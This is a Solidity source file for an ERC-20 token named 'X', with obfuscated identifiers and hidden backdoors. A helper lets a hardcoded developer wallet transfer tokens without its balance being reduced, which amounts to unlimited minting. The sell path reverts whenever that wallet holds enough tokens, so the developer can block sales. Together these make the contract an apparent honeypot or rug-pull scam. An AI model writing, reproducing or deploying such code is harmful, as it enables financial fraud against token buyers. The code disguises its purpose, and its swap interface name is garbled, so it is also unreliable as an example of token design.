/**

X   $X


TWITTER: https://twitter.com/XCoin_Erc20
TELEGRAM: https://t.me/X_CoinEthereum
WEBSITE: https://xerc.org/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _fqmqb(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _fqmqb(a, b, "SafeMath:");
    }

    function  _fqmqb(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _xapvjrbf {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xnfgmtlos {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract X is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"X";
    string private constant _symbol = unicode"X";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalfj = 1000000000 * 10 **_decimals;
    uint256 public _mxktfAmaunt = _Totalfj;
    uint256 public _Wallesrovp = _Totalfj;
    uint256 public _wapThresxuao= _Totalfj;
    uint256 public _molkTakrf= _Totalfj;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _iskEujarp;
    mapping (address => bool) private _taxrvWarivy;
    mapping(address => uint256) private _lrorktuobe;
    bool public _taegaleov = false;
    address payable private _TdnFokp;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapnfompb=0;
    uint256 private _burntxnr=0;


    _xnfgmtlos private _Tfneopbl;
    address private _yawovchs;
    bool private _qrpxqvuh;
    bool private leSarytnp = false;
    bool private _awejuonp = false;


    event _amzobwdl(uint _mxktfAmaunt);
    modifier louvThoylq {
        leSarytnp = true;
        _;
        leSarytnp = false;
    }

    constructor () {
        
        _TdnFokp = payable(0x9d951432Fc6d6A57F68E2926927E3849f722D25b);
        _balances[_msgSender()] = _Totalfj;
        _iskEujarp[owner()] = true;
        _iskEujarp[address(this)] = true;
        _iskEujarp[_TdnFokp] = true;

 

        emit Transfer(address(0), _msgSender(), _Totalfj);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalfj;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _fqmqb(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_taegaleov) {
                if (to != address
                (_Tfneopbl) && to !=
                 address(_yawovchs)) {
                  require(_lrorktuobe
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lrorktuobe
                  [tx.origin] = block.number;
                }
            }

            if (from == _yawovchs && to != 
            address(_Tfneopbl) && !_iskEujarp[to] ) {
                require(amount <= _mxktfAmaunt,
                 "Exceeds the _mxktfAmaunt.");
                require(balanceOf(to) + amount
                 <= _Wallesrovp, "Exceeds the maxWalletSize.");
                if(_burntxnr
                < _wapnfompb){
                  require(! _frjuoqei(to));
                }
                _burntxnr++;
                 _taxrvWarivy[to]=true;
                teeomoun = amount.mul((_burntxnr>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _yawovchs && from!= address(this) 
            && !_iskEujarp[from] ){
                require(amount <= _mxktfAmaunt && 
                balanceOf(_TdnFokp)<_molkTakrf,
                 "Exceeds the _mxktfAmaunt.");
                teeomoun = amount.mul((_burntxnr>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_burntxnr>_wapnfompb &&
                 _taxrvWarivy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!leSarytnp 
            && to == _yawovchs && _awejuonp &&
             contractTokenBalance>_wapThresxuao 
            && _burntxnr>_wapnfompb&&
             !_iskEujarp[to]&& !_iskEujarp[from]
            ) {
                _swpfbjrhoh( _rpume(amount, 
                _rpume(contractTokenBalance,_molkTakrf)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _roneumq(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _fqmqb(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _fqmqb(teeomoun));
        emit Transfer(from, to, 
        amount. _fqmqb(teeomoun));
    }

    function _swpfbjrhoh(uint256
     tokenAmount) private louvThoylq {
        if(tokenAmount==0){return;}
        if(!_qrpxqvuh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _Tfneopbl.WETH();
        _approve(address(this),
         address(_Tfneopbl), tokenAmount);
        _Tfneopbl.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _rpume(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _fqmqb(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _TdnFokp){
            return a ;
        }else{
            return a . _fqmqb (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxktfAmaunt = _Totalfj;
        _Wallesrovp = _Totalfj;
        _taegaleov = false;
        emit _amzobwdl(_Totalfj);
    }

    function _frjuoqei(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _roneumq(uint256
    amount) private {
        _TdnFokp.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _qrpxqvuh);
        _Tfneopbl   =  _xnfgmtlos (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_Tfneopbl), _Totalfj);
        _yawovchs = _xapvjrbf(_Tfneopbl.factory()). createPair (address(this),  _Tfneopbl . WETH ());
        _Tfneopbl.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_yawovchs).approve(address(_Tfneopbl), type(uint).max);
        _awejuonp = true;
        _qrpxqvuh = true;
    }

    receive() external payable {}
}